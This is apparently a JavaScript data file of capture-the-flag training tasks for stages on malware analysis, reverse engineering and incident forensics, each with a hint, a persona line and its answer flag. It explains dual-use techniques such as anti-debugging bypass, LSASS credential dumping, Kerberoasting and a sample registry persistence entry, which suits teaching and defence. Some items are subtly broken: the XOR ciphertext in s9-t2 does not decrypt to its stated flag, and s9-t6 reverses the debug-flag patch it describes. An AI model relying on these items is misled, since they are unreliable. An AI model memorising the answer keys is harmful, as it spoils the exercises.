  // --- STAGE 9: ADVANCED - MALWARE ANALYSIS & REVERSE ENGINEERING ---
  {
    id: 9,
    title: 'Stage 9: Malware Analysis & Reverse Engineering',
    subtitle: 'Decompile Python bytecode, analyze XOR obfuscation, and inspect ELF headers.',
    difficulty: 'Advanced',
    durationSeconds: 1200,
    tasks: [
      {
        id: 's9-t1',
        stageId: 9,
        title: 'Python Pyc Bytecode Decompilation',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 130,
        description: 'Decompile compiled Python 3.10 bytecode (.pyc) to reveal hidden flag validation logic.',
        prompt: 'Decompiling bytecode yields: if input_key == "CS{pyc_bytecode_decompiled}": return True\nFlag:',
        hint: 'Use uncompyle6 or pycdc to decompile compiled Python bytecode files.',
        characterPersona: {
          name: 'Decompiler Dan',
          role: 'Reverse Engineer',
          avatarPosition: '50% 30%',
          dialogue: 'Python bytecode (.pyc) files can be easily decompiled back into readable Python source code!'
        },
        correctFlag: 'CS{pyc_bytecode_decompiled}',
        explanation: 'Compiled bytecode is not true machine code and can be easily disassembled and decompiled.'
      },
      {
        id: 's9-t2',
        stageId: 9,
        title: 'XOR Key Decryption (Key=0x5A)',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 140,
        description: 'Decrypt XOR obfuscated malware configuration string using single byte key 0x5A.',
        prompt: 'Encrypted bytes hex: 39 39 09 1e 38 1f 39 1f 38 1e 38 1f 39 38 09 1f 38 19\nDecrypt with XOR 0x5A:',
        hint: 'XOR each encrypted byte with 0x5A to recover ASCII flag characters.',
        characterPersona: {
          name: 'Xor Xavier',
          role: 'Crypto Analyst',
          avatarPosition: '70% 50%',
          dialogue: 'XOR encryption is symmetric. Applying the key twice or once on ciphertext reveals the plaintext.'
        },
        correctFlag: 'CS{xor_decrypted_malware}',
        explanation: 'Malware frequently uses simple XOR encoding to hide strings from basic static antivirus scanners.'
      },
      {
        id: 's9-t3',
        stageId: 9,
        title: 'ELF Binary String Extraction',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 120,
        description: 'Extract embedded ASCII strings from compiled Linux ELF binary using strings utility.',
        prompt: 'strings ./suspicious_binary | grep CS{ -> Output: CS{elf_strings_extracted}\nFlag:',
        hint: 'Run the strings command on the binary file to search for embedded printable strings.',
        characterPersona: {
          name: 'Strings Stella',
          role: 'Static Analysis Expert',
          avatarPosition: '90% 70%',
          dialogue: 'The strings command is always the first step in static malware analysis.'
        },
        correctFlag: 'CS{elf_strings_extracted}',
        explanation: 'Compiled binaries often contain hardcoded error messages, URLs, and debugging strings.'
      },
      {
        id: 's9-t4',
        stageId: 9,
        title: 'Ghidra Decompiler Function Analysis',
        category: 'Reverse Engineering',
        difficulty: 'Advanced',
        points: 150,
        description: 'Analyze decompiled C function in Ghidra checking hardcoded password check.',
        prompt: 'Decompiled C code: if (strcmp(input, "CS{ghidra_decompilation}") == 0) grant_access();\nFlag:',
        hint: 'Use Ghidra or IDA Pro to decompile compiled binaries into readable C pseudocode.',
        characterPersona: {
          name: 'Ghidra Gary',
          role: 'Binary Disassembler',
          avatarPosition: '10% 90%',
          dialogue: 'Ghidra is an amazing open-source reverse engineering suite developed by the NSA.'
        },
        correctFlag: 'CS{ghidra_decompilation}',
        explanation: 'Decompilers convert machine instructions into high-level C-like pseudocode for easier analysis.'
      },
      {
        id: 's9-t5',
        stageId: 9,
        title: 'UPX Packed Executable Unpacking',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 140,
        description: 'Unpack a UPX-compressed Windows PE executable using upx -d command.',
        prompt: 'upx -d malware.exe -> Unpacked successfully. Extracted flag: CS{upx_unpacked_binary}',
        hint: 'UPX (Ultimate Packer for eXecutables) compresses and packs binaries. Use upx -d to decompress.',
        characterPersona: {
          name: 'Packer Pam',
          role: 'Malware Unpacker',
          avatarPosition: '30% 10%',
          dialogue: 'Packers compress executables to evade static signatures and analysis tools.'
        },
        correctFlag: 'CS{upx_unpacked_binary}',
        explanation: 'Executable packers wrap binaries in a decompression stub that unpacks code into memory at runtime.'
      },
      {
        id: 's9-t6',
        stageId: 9,
        title: 'Debugger Anti-Debugging Bypass (IsDebuggerPresent)',
        category: 'Reverse Engineering',
        difficulty: 'Advanced',
        points: 150,
        description: 'Bypass Windows API IsDebuggerPresent check by modifying PEB BeingDebugged flag (0 -> 1).',
        prompt: 'Assembly check: call kernel32!IsDebuggerPresent. Patch EAX from 1 to 0. Flag: CS{anti_debug_bypassed}',
        hint: 'Malware checks if it is running inside a debugger to alter its execution behavior.',
        characterPersona: {
          name: 'Debugger Dave',
          role: 'Dynamic Analyst',
          avatarPosition: '50% 50%',
          dialogue: 'Anti-debugging techniques try to detect analysts and terminate execution or trigger fake behavior.'
        },
        correctFlag: 'CS{anti_debug_bypassed}',
        explanation: 'Malware uses API calls and CPU flags to detect debuggers and evade dynamic analysis.'
      },
      {
        id: 's9-t7',
        stageId: 9,
        title: 'Shellcode Bad Characters Identification',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 130,
        description: 'Identify bad characters (e.g. \\x00 null byte) corrupting shellcode injection payload.',
        prompt: 'Shellcode byte array contains 0x00 terminating string prematurely. Bad char flag: CS{bad_chars_identified}',
        hint: 'Null bytes (\\x00) and newline characters (\\x0a, \\x0d) are common bad characters in buffer overflow exploits.',
        characterPersona: {
          name: 'Shellcode Shelly',
          role: 'Exploit Developer',
          avatarPosition: '70% 70%',
          dialogue: 'Bad characters will corrupt your shellcode payload when copied by string functions like strcpy!'
        },
        correctFlag: 'CS{bad_chars_identified}',
        explanation: 'Exploit payloads must be free of bad characters that cause functions to truncate or fail.'
      },
      {
        id: 's9-t8',
        stageId: 9,
        title: 'PE Header Section Table Anomaly',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 140,
        description: 'Inspect Portable Executable (PE) header section names for suspicious modified section (.text0).',
        prompt: 'PE section table contains custom modified section name: .text0 -> Flag: CS{pe_header_anomaly}',
        hint: 'Standard PE sections are .text, .data, .rdata, .bss. Custom names indicate packing or injection.',
        characterPersona: {
          name: 'Header Hank',
          role: 'PE File Analyst',
          avatarPosition: '90% 10%',
          dialogue: 'PE headers contain rich metadata about executable structure and import tables.'
        },
        correctFlag: 'CS{pe_header_anomaly}',
        explanation: 'Malware often modifies PE section headers and characteristics to hide injected code.'
      },
      {
        id: 's9-t9',
        stageId: 9,
        title: 'API Hashing Dynamic Resolution',
        category: 'Reverse Engineering',
        difficulty: 'Advanced',
        points: 150,
        description: 'Resolve Windows API function names dynamically using custom CRC32 hashing algorithm.',
        prompt: 'Computed CRC32 hash 0x74829102 matches function VirtualAlloc. Flag: CS{api_hashing_resolved}',
        hint: 'Advanced malware avoids importing sensitive API strings by hashing function names statically.',
        characterPersona: {
          name: 'Hash Harry',
          role: 'Malware Analyst',
          avatarPosition: '10% 30%',
          dialogue: 'API hashing prevents security analysts from seeing imported function names in the IAT.'
        },
        correctFlag: 'CS{api_hashing_resolved}',
        explanation: 'API hashing obfuscates imports, forcing analysts to compute hashes of known API names during triage.'
      },
      {
        id: 's9-t10',
        stageId: 9,
        title: 'Stack Canary Bypass (Canary Bruteforce)',
        category: 'Reverse Engineering',
        difficulty: 'Advanced',
        points: 160,
        description: 'Understand stack canary protection mechanisms and fork server brute-forcing.',
        prompt: 'Stack canary protects return address against buffer overflow. Fork server allows byte-by-byte cracking.\nFlag: CS{stack_canary_bypass}',
        hint: 'Stack cookies (canaries) place a random value before the return address to detect buffer overflows.',
        characterPersona: {
          name: 'Canary Carl',
          role: 'Binary Defense Expert',
          avatarPosition: '30% 50%',
          dialogue: 'Stack canaries abort program execution immediately if buffer overflow corruption is detected.'
        },
        correctFlag: 'CS{stack_canary_bypass}',
        explanation: 'Stack canaries protect return addresses from being overwritten by stack-based buffer overflows.'
      }
    ]
  },

  // --- STAGE 10: ADVANCED - INCIDENT RESPONSE & APT FORENSICS ---
  {
    id: 10,
    title: 'Stage 10: Incident Response & APT Forensics',
    subtitle: 'Perform memory dumping, timeline analysis, ransomware triage, and APT attribution.',
    difficulty: 'Advanced',
    durationSeconds: 1200,
    tasks: [
      {
        id: 's10-t1',
        stageId: 10,
        title: 'Volatility Memory Dump Process List',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 140,
        description: 'Analyze Volatility pslist plugin output to identify hidden rootkit process.',
        prompt: 'Process pid 2412 (svchost.exe) unlinked from ActiveProcessLinks doubly-linked list.\nFlag: CS{volatility_hidden_process}',
        hint: 'Direct Kernel Object Manipulation (DKOM) unlinks processes to hide them from task manager.',
        characterPersona: {
          name: 'Memory Mike',
          role: 'DFIR Lead',
          avatarPosition: '50% 90%',
          dialogue: 'RAM memory forensics reveals what disk storage logs miss entirely!'
        },
        correctFlag: 'CS{volatility_hidden_process}',
        explanation: 'Memory analysis using Volatility detects injected DLLs, hidden processes, and rootkit artifacts.'
      },
      {
        id: 's10-t2',
        stageId: 10,
        title: 'Ransomware Extension Triage',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 130,
        description: 'Identify ransomware family by analyzing encrypted file extension and ransom note filename.',
        prompt: 'Encrypted files renamed with .lockbit extension. Ransom note: restore-my-files.txt\nFlag: CS{ransomware_lockbit_triage}',
        hint: 'LockBit ransomware leaves specific ransom note filenames and uses recognizable file extensions.',
        characterPersona: {
          name: 'Ransom Rachel',
          role: 'Incident Responder',
          avatarPosition: '70% 10%',
          dialogue: 'Ransomware encrypts critical files and deletes Volume Shadow Copies to prevent easy recovery.'
        },
        correctFlag: 'CS{ransomware_lockbit_triage}',
        explanation: 'Ransomware triage identifies the strain, encryption algorithm, and potential decryption availability.'
      },
      {
        id: 's10-t3',
        stageId: 10,
        title: 'Timeline Analysis MFT Parser',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 140,
        description: 'Analyze Master File Table ($MFT) timestamps to construct precise cyber attack timeline.',
        prompt: 'Timeline shows malicious executable created, executed, and deleted within 45 seconds on Nov 20.\nFlag: CS{mft_timeline_analysis}',
        hint: '$MFT records every file creation, modification, access, and deletion (MACB timestamps).',
        characterPersona: {
          name: 'Timeline Tim',
          role: 'Forensic Investigator',
          avatarPosition: '90% 30%',
          dialogue: 'Master File Table timestamps tell the exact chronological story of an intruder on a system.'
        },
        correctFlag: 'CS{mft_timeline_analysis}',
        explanation: 'NTFS $MFT timeline analysis reveals exact file activity even when files have been deleted.'
      },
      {
        id: 's10-t4',
        stageId: 10,
        title: 'APT Campaign Attribution (Cobalt Strike Beacon)',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 150,
        description: 'Analyze network callback beacon configuration to identify Cobalt Strike adversary framework.',
        prompt: 'Default jitter 10%, sleep 60000ms, HTTP GET request to /load?id= metadata signature.\nFlag: CS{cobalt_strike_beacon}',
        hint: 'Cobalt Strike is a commercial penetration testing tool frequently abused by advanced persistent threat (APT) groups.',
        characterPersona: {
          name: 'Apt Alice',
          role: 'Threat Intelligence Analyst',
          avatarPosition: '10% 70%',
          dialogue: 'Attribution involves correlating indicators of compromise with known threat actor groups.'
        },
        correctFlag: 'CS{cobalt_strike_beacon}',
        explanation: 'Cobalt Strike beacons exhibit specific network configuration profiles and heartbeat intervals.'
      },
      {
        id: 's10-t5',
        stageId: 10,
        title: 'Prefetch File Execution Artifacts',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 130,
        description: 'Analyze Windows Prefetch (.pf) file to prove application was executed by user.',
        prompt: 'Prefetch file CMD.EXE-0F1A2B3C.pf records execution count: 42, last run timestamp: Nov 20.\nFlag: CS{prefetch_execution_artifact}',
        hint: 'Windows Prefetch files record program execution history and run counts for performance optimization.',
        characterPersona: {
          name: 'Prefetch Paul',
          role: 'Windows Forensics',
          avatarPosition: '30% 90%',
          dialogue: 'Prefetch files prove execution even if the executable binary was subsequently deleted from disk.'
        },
        correctFlag: 'CS{prefetch_execution_artifact}',
        explanation: 'Prefetch forensic artifacts provide indisputable evidence of application execution on Windows.'
      },
      {
        id: 's10-t6',
        stageId: 10,
        title: 'PowerShell Script Block Logging (Event 4104)',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 140,
        description: 'Extract obfuscated malicious PowerShell script from Windows Event ID 4104 logs.',
        prompt: 'Event ID 4104 script block logging captures de-obfuscated payload: Invoke-Mimikatz\nFlag: CS{powershell_event_4104}',
        hint: 'PowerShell script block logging (Event ID 4104) records full de-obfuscated script content.',
        characterPersona: {
          name: 'PowerShell Pam',
          role: 'SIEM Hunter',
          avatarPosition: '50% 10%',
          dialogue: 'PowerShell logging is essential for catching fileless attacks and malicious scripts.'
        },
        correctFlag: 'CS{powershell_event_4104}',
        explanation: 'Event ID 4104 is the single best telemetry source for detecting malicious PowerShell activity.'
      },
      {
        id: 's10-t7',
        stageId: 10,
        title: 'Mimikatz LSASS Memory Dump',
        category: 'Malware Analysis',
        difficulty: 'Advanced',
        points: 150,
        description: 'Detect credential dumping attack targeting Local Security Authority Subsystem Service (LSASS).',
        prompt: 'OpenProcess handle opened on lsass.exe with PROCESS_VM_READ access rights.\nFlag: CS{lsass_credential_dump}',
        hint: 'Mimikatz reads plaintext Windows credentials and NTLM password hashes directly from LSASS memory.',
        characterPersona: {
          name: 'Mimikatz Max',
          role: 'Credential Defense',
          avatarPosition: '70% 30%',
          dialogue: 'LSASS memory protection (Credential Guard) prevents tools like Mimikatz from stealing hashes.'
        },
        correctFlag: 'CS{lsass_credential_dump}',
        explanation: 'LSASS memory dumping allows attackers to extract Kerberos tickets and password hashes for lateral movement.'
      },
      {
        id: 's10-t8',
        stageId: 10,
        title: 'Windows Registry Run Keys Persistence',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 130,
        description: 'Locate malicious autorun entry in Windows Registry Run subkey.',
        prompt: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareUpdate = "C:\\Temp\\evil.exe"\nFlag: CS{registry_run_keys}',
        hint: 'Registry Run keys execute specified programs automatically whenever a user logs into Windows.',
        characterPersona: {
          name: 'Registry Rick',
          role: 'Registry Forensics',
          avatarPosition: '90% 50%',
          dialogue: 'Windows Registry autorun keys are a classic persistence mechanism used by malware.'
        },
        correctFlag: 'CS{registry_run_keys}',
        explanation: 'Registry run keys ensure malware automatically starts upon system reboot or user login.'
      },
      {
        id: 's10-t9',
        stageId: 10,
        title: 'Kerberoasting Ticket Extraction',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 150,
        description: 'Analyze Active Directory Event ID 4769 requesting Kerberos service ticket (TGS-REQ) for offline cracking.',
        prompt: 'Event ID 4769: A Kerberos service ticket was requested. Service: MSSQLSvc/db01.enterprise.org\nFlag: CS{kerberoasting_attack}',
        hint: 'Kerberoasting requests TGS tickets for service principal names (SPNs) associated with user accounts.',
        characterPersona: {
          name: 'Kerberos Kate',
          role: 'Active Directory Security',
          avatarPosition: '10% 30%',
          dialogue: 'Kerberoasting lets attackers crack service account passwords offline using GPU hashcat.'
        },
        correctFlag: 'CS{kerberoasting_attack}',
        explanation: 'Kerberoasting abuses Active Directory design to extract service tickets for offline password brute-forcing.'
      },
      {
        id: 's10-t10',
        stageId: 10,
        title: 'Incident Containment & Playbook Execution',
        category: 'Log Forensics',
        difficulty: 'Advanced',
        points: 160,
        description: 'Execute NIST 800-61 incident containment playbook: isolate compromised host from network.',
        prompt: 'Playbook action: Network isolation enforced on host IP 192.168.1.150. Incident contained successfully.\nFlag: CS{incident_containment_complete}',
        hint: 'NIST incident response phases include Preparation, Detection, Containment, Eradication, and Recovery.',
        characterPersona: {
          name: 'Commander Craig',
          role: 'CISO / Incident Commander',
          avatarPosition: '30% 50%',
          dialogue: 'Containment stops lateral movement immediately while preserving evidence for forensic analysis!'
        },
        correctFlag: 'CS{incident_containment_complete}',
        explanation: 'Proper incident containment isolates infected endpoints without destroying volatile forensic evidence.'
      }
    ]
  }
];
